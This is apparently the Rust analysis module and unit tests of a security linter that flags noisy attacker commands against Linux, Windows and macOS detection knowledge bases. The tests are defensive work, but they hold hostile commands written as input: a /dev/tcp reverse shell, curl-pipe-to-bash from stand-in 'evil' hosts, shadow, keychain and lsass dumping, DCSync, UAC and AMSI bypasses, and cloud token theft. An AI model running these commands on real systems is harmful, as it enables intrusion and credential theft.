//! Walks parsed input, resolves each action against the knowledge base, and
//! produces a [`Report`] of detection-coverage findings.

use std::collections::HashSet;

use crate::model::{Finding, KnowledgeBase, Report, Severity};
use crate::parser::{self, parse_line};

fn finding_from_entry(
    entry: &crate::model::KbEntry,
    line: usize,
    matched_command: Option<crate::parser::Command>,
) -> Finding {
    Finding {
        line,
        source: "opseclint".to_string(),
        rule_id: entry.id.clone(),
        description: entry.description.clone(),
        techniques: entry.techniques.clone(),
        telemetry: entry.telemetry.clone(),
        detections: entry.detections.clone(),
        edr: Vec::new(),
        noise: entry.noise,
        severity: Severity::from_noise(entry.noise),
        matched_command,
    }
}

/// Analyze a full input (a script, playbook, or single line) against the KB.
pub fn analyze(input: &str, kb: &KnowledgeBase) -> Report {
    let mut findings = Vec::new();
    let mut lines_analyzed = 0;

    for unit in parser::preprocess(input) {
        let trimmed = unit.text.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        lines_analyzed += 1;

        // Commands from the line, plus any nested command substitutions so the
        // program inside `$(...)` / backticks is resolved too.
        let mut commands = parse_line(&unit.text);
        for sub in parser::command_substitutions(&unit.text) {
            commands.extend(parse_line(&sub));
        }

        // Dedupe entries per unit so a rule matched by multiple segments (or by
        // both a command and a raw match) is reported once.
        let mut seen: HashSet<&str> = HashSet::new();

        for entry in &kb.entries {
            // `evaluate` yields the specific command that matched (for
            // command-scoped matchers) or the line's first command (for
            // line-scoped matches), kept so coverage analysis can evaluate rule
            // logic against it.
            if let Some(matched_command) = entry.matcher.evaluate(&commands, trimmed)
                && seen.insert(entry.id.as_str())
            {
                findings.push(finding_from_entry(entry, unit.line, matched_command));
            }
        }
    }

    // Order findings loudest-first, then by line for stable output.
    findings.sort_by(|a, b| {
        b.noise
            .cmp(&a.noise)
            .then(a.line.cmp(&b.line))
            .then(a.rule_id.cmp(&b.rule_id))
    });

    let max_noise = findings.iter().map(|f| f.noise).max().unwrap_or(0);

    Report {
        platform: kb.platform.clone(),
        note: kb.note.clone(),
        findings,
        max_noise,
        lines_analyzed,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::kb;

    fn kb() -> KnowledgeBase {
        kb::load(kb::Platform::LinuxAuditd).expect("embedded KB must parse")
    }

    fn win_kb() -> KnowledgeBase {
        kb::load(kb::Platform::WindowsSysmon).expect("windows KB must parse")
    }

    fn mac_kb() -> KnowledgeBase {
        kb::load(kb::Platform::MacosEs).expect("macos KB must parse")
    }

    #[test]
    fn macos_kb_detects_keychain_and_gatekeeper() {
        let report = analyze("security dump-keychain -d login.keychain", &mac_kb());
        assert_eq!(report.platform, "macos-es");
        assert!(report.findings.iter().any(|f| f.rule_id == "keychain-dump"));

        let gk = analyze("sudo spctl --master-disable", &mac_kb());
        let f = gk
            .findings
            .iter()
            .find(|f| f.rule_id == "gatekeeper-disable")
            .unwrap();
        assert_eq!(f.techniques[0].id, "T1553.001");
    }

    #[test]
    fn macos_kb_detects_macos_specific_tradecraft() {
        // Dynamic-linker hijacking via DYLD_INSERT_LIBRARIES.
        let dyld = analyze(
            "DYLD_INSERT_LIBRARIES=/tmp/evil.dylib /Applications/X.app/Contents/MacOS/X",
            &mac_kb(),
        );
        let f = dyld
            .findings
            .iter()
            .find(|f| f.rule_id == "dyld-insert")
            .expect("DYLD_INSERT_LIBRARIES injection should be detected");
        assert_eq!(f.techniques[0].id, "T1574.006");
        assert!(f.noise >= 75);

        // Local password-hash extraction via dscl ShadowHashData.
        let hash = analyze("sudo dscl . read /Users/victim ShadowHashData", &mac_kb());
        assert!(hash.findings.iter().any(|f| f.rule_id == "shadowhash-dump"));

        // LoginHook persistence.
        let hook = analyze(
            "defaults write com.apple.loginwindow LoginHook /tmp/evil.sh",
            &mac_kb(),
        );
        assert!(
            hook.findings
                .iter()
                .any(|f| f.rule_id == "loginhook-persist")
        );
    }

    #[test]
    fn macos_kb_has_reached_platform_parity() {
        // macOS coverage was deepened to match Linux/Windows breadth.
        let mac = mac_kb();
        // Matches the count documented in the README/CHANGELOG; still allows
        // future growth, but catches a regression below the claimed breadth.
        assert!(
            mac.entries.len() >= 66,
            "expected a grown macOS KB, got {}",
            mac.entries.len()
        );
    }

    #[test]
    fn windows_kb_detects_lolbin_and_normalizes_exe_path() {
        // .exe extension and a full Windows path must still resolve to certutil.
        let report = analyze(
            "C:\\Windows\\System32\\certutil.exe -urlcache -f http://x/a.exe a.exe",
            &win_kb(),
        );
        assert_eq!(report.platform, "windows-sysmon");
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "certutil-download")
        );
    }

    #[test]
    fn windows_kb_detects_lsass_dump() {
        let report = analyze(
            "rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump 660 lsass.dmp full",
            &win_kb(),
        );
        assert!(report.findings.iter().any(|f| f.rule_id == "lsass-comsvcs"));
    }

    #[test]
    fn windows_kb_detects_ad_tradecraft() {
        let report = analyze("Invoke-Kerberoast -OutputFormat Hashcat", &win_kb());
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "kerberoast-invoke")
        );

        let dcsync = analyze("lsadump::dcsync /domain:corp.local /user:krbtgt", &win_kb());
        let f = dcsync
            .findings
            .iter()
            .find(|f| f.rule_id == "dcsync")
            .unwrap();
        assert_eq!(f.techniques[0].id, "T1003.006");
    }

    #[test]
    fn windows_kb_detects_lolbins_and_uac_bypass() {
        // Remote MSI install (LOLBin proxy execution).
        let msi = analyze("msiexec /q /i http://evil.example/x.msi", &win_kb());
        let f = msi
            .findings
            .iter()
            .find(|f| f.rule_id == "msiexec-remote")
            .expect("msiexec remote install should be detected");
        assert_eq!(f.techniques[0].id, "T1218.007");

        // UAC bypass and AMSI bypass.
        let uac = analyze("C:\\Windows\\System32\\fodhelper.exe", &win_kb());
        assert!(
            uac.findings
                .iter()
                .any(|f| f.rule_id == "uac-bypass-fodhelper")
        );
        let amsi = analyze(
            "[Ref].Assembly...SetValue($null,$true) amsiInitFailed",
            &win_kb(),
        );
        assert!(amsi.findings.iter().any(|f| f.rule_id == "amsi-bypass"));
    }

    #[test]
    fn linux_kb_detects_cloud_and_container_tradecraft() {
        // Cloud instance metadata credential theft.
        let imds = analyze("curl http://169.254.169.254/latest/meta-data/iam/", &kb());
        let f = imds
            .findings
            .iter()
            .find(|f| f.rule_id == "cloud-imds")
            .expect("cloud metadata access should be detected");
        assert_eq!(f.techniques[0].id, "T1552.005");

        // Kubernetes service-account token theft.
        let tok = analyze(
            "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
            &kb(),
        );
        assert!(tok.findings.iter().any(|f| f.rule_id == "k8s-sa-token"));

        // Container escape via nsenter into host namespaces.
        let esc = analyze("nsenter --target 1 --mount --net -- bash", &kb());
        let f = esc
            .findings
            .iter()
            .find(|f| f.rule_id == "nsenter-escape")
            .unwrap();
        assert_eq!(f.techniques[0].id, "T1611");
    }

    #[test]
    fn detects_reverse_shell() {
        let report = analyze("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", &kb());
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "reverse-shell-devtcp")
        );
        assert!(report.max_noise >= 75);
    }

    #[test]
    fn detects_shadow_read() {
        let report = analyze("sudo cat /etc/shadow", &kb());
        assert!(report.findings.iter().any(|f| f.rule_id == "shadow-read"));
    }

    #[test]
    fn detects_curl_pipe_bash() {
        let report = analyze("curl http://evil/x.sh | bash", &kb());
        let ids: Vec<_> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
        assert!(ids.contains(&"curl"));
        assert!(ids.contains(&"pipe-to-shell"));
    }

    #[test]
    fn benign_line_is_quiet() {
        let report = analyze("echo hello world", &kb());
        assert!(report.findings.is_empty());
    }

    #[test]
    fn no_double_count_per_line() {
        // `id` appears twice on the line but should be reported once.
        let report = analyze("id && id", &kb());
        let count = report.findings.iter().filter(|f| f.rule_id == "id").count();
        assert_eq!(count, 1);
    }

    #[test]
    fn detects_private_key_theft() {
        let report = analyze("cp ~/.ssh/id_rsa /tmp/k", &kb());
        assert!(
            report
                .findings
                .iter()
                .any(|f| f.rule_id == "private-key-rsa")
        );
    }

    #[test]
    fn detects_docker_socket_escape() {
        let report = analyze(
            "curl --unix-socket /var/run/docker.sock http://x/containers/json",
            &kb(),
        );
        assert!(report.findings.iter().any(|f| f.rule_id == "docker-sock"));
    }

    #[test]
    fn kb_all_entries_parse() {
        let kb = kb();
        assert!(
            kb.entries.len() >= 55,
            "expected a grown KB, got {}",
            kb.entries.len()
        );
    }

    #[test]
    fn resolves_command_in_substitution() {
        // The reverse shell is hidden inside a command substitution.
        let report = analyze("data=$(cat /etc/shadow)", &kb());
        assert!(report.findings.iter().any(|f| f.rule_id == "shadow-read"));
    }

    #[test]
    fn analyzes_shell_heredoc_body_at_correct_line() {
        let script = "bash <<EOF\nid\ncurl http://evil/x | bash\nEOF\n";
        let report = analyze(script, &kb());
        // The pipe-to-shell inside the here-doc body (line 3) is detected.
        let f = report
            .findings
            .iter()
            .find(|f| f.rule_id == "pipe-to-shell")
            .expect("pipe-to-shell should be found in heredoc body");
        assert_eq!(f.line, 3);
    }

    #[test]
    fn ignores_data_heredoc_body() {
        // A password in a `cat` here-doc body is data, not a command.
        let script = "cat <<EOF > /tmp/conf\npassword=hunter2\nEOF\n";
        let report = analyze(script, &kb());
        assert!(report.findings.is_empty());
    }

    // ---- Known-benign corpus -------------------------------------------------
    // Ordinary, security-irrelevant commands that MUST yield zero findings. This
    // guards against knowledge-base false positives from loose substring matches.
    // It deliberately excludes actions opseclint intentionally models as loud
    // (curl/wget, tar archiving, `ps`/`find`/kubectl discovery, whoami, etc.).

    const BENIGN_LINUX: &[&str] = &[
        "ls -la /home/user",
        "cd /var/log",             // reads and navigation under /var/log must not
        "tail -f /var/log/syslog", // be read as anti-forensic log clearing
        "ls /var/log/nginx",
        "cat /var/log/app.log",
        "cd /var/log && rm -rf target/debug", // rm not targeting /var/log, even
        "cd /var/log && ls -la",              // when the line also mentions it
        "pwd",
        "echo build complete",
        "cat README.md",
        "mkdir -p build/output",
        "cp config.example config.local",
        "mv old.txt new.txt",
        "rm -rf target/debug",
        "grep -rn TODO src/",
        "sed -i s/foo/bar/g file.txt",
        "git status",
        "git commit -m fix",
        "git push origin main",
        "cargo build --release",
        "cargo test --all",
        "npm install",
        "make -j4",
        "head -n 20 file.log",
        "df -h",
        "docker build -t app .",
        "systemctl status nginx",
    ];

    const BENIGN_WINDOWS: &[&str] = &[
        "dir C:\\Users",
        "type readme.txt",
        "copy a.txt b.txt",
        "del old.log",
        "mkdir builds",
        "Get-ChildItem -Path .",
        "Get-Content log.txt",
        "Write-Output done",
        "git status",
        "cargo build",
        "Get-Process",
        "Set-Location C:\\src",
        "Copy-Item a b",
        "New-Item -ItemType Directory build",
        "Remove-Item -Recurse target",
    ];

    const BENIGN_MACOS: &[&str] = &[
        "ls -la /Users",
        "cd /Applications",
        "pwd",
        "cat ~/notes.txt",
        "open .",
        "mkdir -p ~/dev/project",
        "cp a.txt b.txt",
        "git status",
        "brew list",
        "defaults read com.apple.dock",
        "diskutil list",
        "softwareupdate --list",
    ];

    fn assert_all_quiet(corpus: &[&str], kb: &KnowledgeBase) {
        for cmd in corpus {
            let report = analyze(cmd, kb);
            assert!(
                report.findings.is_empty(),
                "benign command `{cmd}` produced a false positive: {:?}",
                report
                    .findings
                    .iter()
                    .map(|f| f.rule_id.as_str())
                    .collect::<Vec<_>>()
            );
        }
    }

    #[test]
    fn benign_corpus_linux_is_silent() {
        assert_all_quiet(BENIGN_LINUX, &kb());
    }

    #[test]
    fn benign_corpus_windows_is_silent() {
        assert_all_quiet(BENIGN_WINDOWS, &win_kb());
    }

    #[test]
    fn benign_corpus_macos_is_silent() {
        assert_all_quiet(BENIGN_MACOS, &mac_kb());
    }

    #[test]
    fn clear_syslog_still_detects_real_clearing() {
        // The false-positive fix must not blind us to actual log clearing.
        for cmd in [
            "rm -rf /var/log/nginx",
            "truncate -s 0 /var/log/syslog",
            "shred -u /var/log/auth.log",
            "cd /tmp && rm -rf /var/log/nginx", // arg-scoped: still fires in a
                                                // compound line where rm hits /var/log
        ] {
            let report = analyze(cmd, &kb());
            assert!(
                report
                    .findings
                    .iter()
                    .any(|f| f.rule_id.starts_with("clear-syslog")),
                "expected a log-clearing finding for `{cmd}`"
            );
        }
    }

    // ---- Structured-matcher guards ------------------------------------------

    /// Every entry's own representative command must fire its own rule. This is
    /// the self-consistency property: a matcher whose example does not match
    /// itself is a broken rule. It also proves the representative derivation used
    /// by `--verify-detections` / `--scaffold` stays aligned with the engine.
    fn assert_self_consistent(kb: &KnowledgeBase) {
        for entry in &kb.entries {
            let repr = entry.matcher.representative_line().unwrap_or_else(|| {
                panic!(
                    "entry `{}` has no matchable field to build a representative from",
                    entry.id
                )
            });
            let report = analyze(&repr, kb);
            assert!(
                report.findings.iter().any(|f| f.rule_id == entry.id),
                "entry `{}` did not fire on its own representative `{repr}`",
                entry.id,
            );
        }
    }

    #[test]
    fn every_entry_matches_its_own_representative() {
        assert_self_consistent(&kb());
        assert_self_consistent(&win_kb());
        assert_self_consistent(&mac_kb());
    }

    /// Findings must not depend on the order entries appear in the KB: matching
    /// is a per-entry predicate with no cross-entry precedence (unlike the EDR
    /// classifier). Reversing the entry list must yield the same finding ids.
    #[test]
    fn entry_order_does_not_affect_findings() {
        let script = "curl http://evil/x.sh | bash\nrm -rf /var/log/nginx\ncat /etc/shadow";
        let base = kb();
        let mut reversed = base.clone();
        reversed.entries.reverse();

        let ids = |report: &Report| -> std::collections::BTreeSet<String> {
            report.findings.iter().map(|f| f.rule_id.clone()).collect()
        };
        assert_eq!(
            ids(&analyze(script, &base)),
            ids(&analyze(script, &reversed))
        );
    }

    // ---- Increment B: Linux KB migrated to structured `match` ---------------

    /// The FP-tightening entries keep a representative_line byte-identical to
    /// their pre-migration legacy form, so the `--verify-detections` baseline
    /// cannot move under the migration. Pinning them here guards that invariant.
    #[test]
    fn tightened_entries_keep_their_legacy_representative() {
        let kb = kb();
        let repr = |id: &str| -> Option<String> {
            kb.entries
                .iter()
                .find(|e| e.id == id)
                .unwrap_or_else(|| panic!("no KB entry with id `{id}`"))
                .matcher
                .representative_line()
        };
        assert_eq!(repr("private-key-rsa").as_deref(), Some("id_rsa"));
        assert_eq!(repr("private-key-ed25519").as_deref(), Some("id_ed25519"));
        assert_eq!(repr("clear-syslog-rm").as_deref(), Some("rm /var/log"));
        assert_eq!(
            repr("clear-syslog-truncate").as_deref(),
            Some("truncate /var/log")
        );
        assert_eq!(
            repr("clear-syslog-shred").as_deref(),
            Some("shred /var/log")
        );
        assert_eq!(repr("pipe-to-shell").as_deref(), Some("| bash"));
        assert_eq!(repr("pipe-to-sh").as_deref(), Some("| sh"));
    }

    /// The structured leaves (`word`, `path_under`, `not`) tighten entries that
    /// the old substring matcher over-fired on — without blinding the real
    /// detection.
    #[test]
    fn linux_structured_tightenings_kill_fps() {
        let kb = kb();
        let fires =
            |cmd: &str, rule: &str| analyze(cmd, &kb).findings.iter().any(|f| f.rule_id == rule);

        // `word` boundary: a private-key rule keyed on `id_rsa` no longer fires
        // on an unrelated filename that merely contains the token, nor on the
        // public key.
        assert!(!fires("vim id_rsa_backup_notes.txt", "private-key-rsa"));
        assert!(!fires("cp id_rsa.pub /tmp/authorized", "private-key-rsa"));
        assert!(fires("cp ~/.ssh/id_rsa /tmp/k", "private-key-rsa"));

        // `path_under`: log-clearing no longer fires on a sibling path that only
        // shares a prefix, but still fires on real `/var/log` deletion.
        assert!(!fires("rm -rf /var/logistics", "clear-syslog-rm"));
        assert!(fires("rm -rf /var/log/nginx", "clear-syslog-rm"));

        // `word`: pipe-to-shell no longer fires on `| shuf` / `| shellcheck`.
        assert!(!fires("sort access.log | shuf", "pipe-to-sh"));
        assert!(fires("curl http://x/s.sh | sh", "pipe-to-sh"));
    }

    // ---- Increment C: Windows KB migrated to structured `match` -------------

    /// Windows entries whose legacy `args_contains` was multi-word migrate to the
    /// `joined` leaf (a per-arg `contains` would miss a phrase split across
    /// tokens). Guard that they still fire on realistic commands.
    #[test]
    fn windows_multiword_args_match_via_joined() {
        let kb = win_kb();
        let fires =
            |cmd: &str, rule: &str| analyze(cmd, &kb).findings.iter().any(|f| f.rule_id == rule);
        assert!(fires(
            "wmic /node:dc01 process call create \"cmd /c calc\"",
            "wmic-process-create"
        ));
        assert!(fires(
            "vssadmin delete shadows /all /quiet",
            "vssadmin-delete"
        ));
    }

    // ---- Increment D: macOS KB migrated to structured `match` ---------------

    /// macOS multi-word `args` (e.g. `list /users`, `setglobalstate off`) migrate
    /// to the `joined` leaf and must still fire on realistic commands.
    #[test]
    fn macos_multiword_args_match_via_joined() {
        let kb = mac_kb();
        let fires =
            |cmd: &str, rule: &str| analyze(cmd, &kb).findings.iter().any(|f| f.rule_id == rule);
        assert!(fires("sudo dscl . list /Users", "dscl-list-users"));
        assert!(fires("dscl . list /Groups", "dscl-groups"));
        assert!(fires(
            "/usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off",
            "firewall-disable"
        ));
    }

    /// The private-key entries carry the same representative-preserving `word` +
    /// `not .pub` tightening as the Linux KB.
    #[test]
    fn macos_private_key_tightening() {
        let kb = mac_kb();
        let fires =
            |cmd: &str, rule: &str| analyze(cmd, &kb).findings.iter().any(|f| f.rule_id == rule);
        assert!(!fires("vim id_rsa_backup_notes.txt", "private-key-ssh"));
        assert!(!fires("cp id_rsa.pub /tmp/authorized", "private-key-ssh"));
        assert!(fires("cp ~/.ssh/id_rsa /tmp/k", "private-key-ssh"));
    }
}
